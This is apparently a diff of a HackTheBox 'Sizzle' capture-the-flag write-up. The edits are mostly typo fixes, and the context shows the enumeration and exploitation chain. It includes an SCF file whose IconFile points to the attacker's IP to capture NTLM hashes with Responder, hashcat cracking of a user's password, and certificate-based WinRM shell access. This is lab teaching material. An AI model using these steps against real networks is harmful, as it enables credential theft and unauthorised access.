@@ -98,9 +98,9 @@ Anonymous login is allowed but we see nothing in there and we can't upload anyth
 
 The web page shows a GIF of sizzling bacon and nothing more valuable on here.
 
-## Checking DNS
+## Checking DNS (Port 53)
 
-Nslookup does not give us any information about other servers but on the NMAP scan we see the domains **HTB.LOCAL** and **sizzle.htb.local** that we should check.
+Nslookup does not give us any information about other servers but on the Nmap scan we see the domains **HTB.LOCAL** and **sizzle.htb.local** that we should check.
 Scanning for the domain **HTB.LOCAL** does give us an IPv6 address and scanning for **sizzle.htb.local** gives us the exact same thing, which means this box is the domain controller for this domain:
 ```markdown
 > server 10.10.10.103
@@ -116,7 +116,7 @@ Name:   sizzle.htb.local
 Address: dead:beef::68ff:77d6:ed8d:ba49
 ```
 
-Let's put this domain names into our hosts file.
+Let's put these domain names into our hosts file.
 
 ## Checking HTTPS (Port 443)
 
@@ -127,9 +127,9 @@ On this web page we see the same as on port 80 but we can analyze the SSL certif
 
 A directory search with _Gobuster_ doesn't find anything valuable.
 
-## Checking LDAP
+## Checking LDAP (Port 389)
 
-We will enumrate LDAP with _ldapsearch_:
+We will enumerate LDAP with _ldapsearch_:
 ```markdown
 ldapsearch -x -h sizzle.htb.local -s base namingcontexts
 ```
@@ -144,7 +144,7 @@ namingContexts: DC=DomainDnsZones,DC=HTB,DC=LOCAL
 namingContexts: DC=ForestDnsZones,DC=HTB,DC=LOCAL
 ```
 
-Lets see if can dump anything out of the domain:
+Lets see if we can dump anything out of the domain:
 ```markdown
 ldapsearch -x -h sizzle.htb.local -s sub -b 'DC=HTB,DC=LOCAL'
 ```
@@ -198,7 +198,7 @@ Then we search for all files:
 find . -ls | tee ~/root/Documents/htb/boxes/sizzle/smbrecon.txt
 ```
 
-The most files are found in the folder **/ZZ_ARCHIVE**. Reviewing these files shows that all of them are filles with NULL bytes and useless.
+The most files are found in the folder **/ZZ_ARCHIVE**. Reviewing these files shows that all of them are filled with NULL bytes and useless.
 
 We can enumarate the **Access Control List** permissions with a tool called **smbcacls** for every folder:
 ```markdown
@@ -216,7 +216,7 @@ ACL:Everyone:ALLOWED/OI|CI|I/READ
 ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
 ```
 
-In the case of the folder _Users_ the owner is the local Administrators group and everyone is allowd to read it.
+In the case of the folder _Users_ the owner is the local Administrators group and everyone is allowed to read it.
 Lets look for all of them with a loop:
 ```markdown
 for i in $(ls); smbcacls -N '//10.10.10.103/Department Shares' $i; done
@@ -226,8 +226,7 @@ After this finishes it is interesting to see that we can write to all folders in
 
 ### SCF File Attack
 
-By doing a [SCF (Shell Command Files) File Attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) we can create an alias for an icon that shows to our IP address 
-and when Windows Explorer opens that directory, tries to pull the icon and attempts to authenticate. We will then take the hash of that authentication.
+By doing a [SCF (Shell Command Files) File Attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) we can create an alias for an icon that shows to our IP address and when Windows Explorer opens that directory, tries to pull the icon and attempts to authenticate, we will take the hash of that authentication.
 
 The file I created is called _steal.scf_ and has this contents:
 ```markdown
@@ -238,7 +237,7 @@ IconFile=\\10.10.14.6\share\stealhash.ico
 Command=ToggleDesktop
 ```
 
-Start **Responder** and then ppload that file to **\Users\Public\**:
+Start **Responder** and then upload that file to **\Users\Public\**:
 ```markdown
 responder -I tun0
 ```
@@ -261,7 +260,7 @@ hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
 The cracked password is:
 > Ashare1972
 
-## Checking SMB with authentication
+### Checking SMB with authentication
 
 Lets see if we have more access on the SMB shares:
 ```markdown
@@ -285,9 +284,9 @@ Now we additionally have read access on _CertEnroll_, _NETLOGON_ and _SYSVOL_.
 ## Checking the Certificate Authority on HTTP
 
 The default path for Certificate Authorities on webservers is **/certsrv** which gives us an 401 (Not Authorized) status code normally.
-But now we can authenticate with the user _amanda_ and see the **Microsoft Active Directory Certificate Services** in which we can request certificates and more.
+But now we can authenticate with the user _amanda_ and see the **Microsoft Active Directory Certificate Services** in which we can request certificates.
 
-The certificate is needed for certificate authentication because the box does no allow password authentication to use the other services.
+The certificate is needed for certificate authentication because the box does not allow password authentication to use the other services.
 
 ```markdown
 # Generate key:
@@ -329,7 +328,7 @@ Certificate:
 
 ### Using Windows Powershell Remoting (Port 5985)
 
-As the full TCP port scan showed the port 5985 and 5986 is open. These services is for Windows **Powershell Remoting**.
+As the full TCP port scan showed the ports 5985 and 5986 are open we will use these services for **Windows Powershell Remoting**.
 We will use a modified version of this [WinRM Ruby script](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) that allows us to start a shell on the box. 
 
 The modified script can be found in this folder with the name _psremote.rb_ in which the authentication method will be with the certificate that we created before.
